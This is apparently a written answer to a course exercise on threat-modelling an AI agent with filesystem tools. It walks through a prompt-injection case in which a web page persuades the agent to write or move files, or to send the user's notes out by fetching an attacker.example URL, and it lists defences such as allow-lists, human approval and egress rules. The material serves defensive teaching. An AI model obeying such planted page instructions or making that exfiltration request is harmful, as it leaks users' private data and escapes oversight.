@@ -1,0 +1,8 @@
+# Exercise: 14.1  Threat model
+# Command:  (none: a written answer)
+# Model:    none
+# Date:     2026-09-26 21:17:26 UTC
+# Exit code: 0
+# Seconds:  0.0
+#-------------------------------------------------------------------------------
+**14.1 Threat model.** *Without the policy layer:* the model reads the page, may be convinced, and calls `fs__write_file` or `fs__move_file`, and nothing stops it. *With it:* (1) delete tools aren't in the allow-list, so the model never sees them; (2) write and move tools need human approval in code; (3) the Filesystem server can only touch `./notes`; (4) the system prompt says tool output is data; (5) the audit log records the attempt. The strongest control is the server-level restriction plus the hidden tools, because they don't depend on the model at all. *And the attack nobody thinks of first:* the page doesn't need a write tool if it can get the agent to **send** your notes out, for example by fetching `https://attacker.example/?d=<notes>`. The egress rules from section 14.6 block that: unknown sites are refused, and any outbound request after private data was read needs approval.
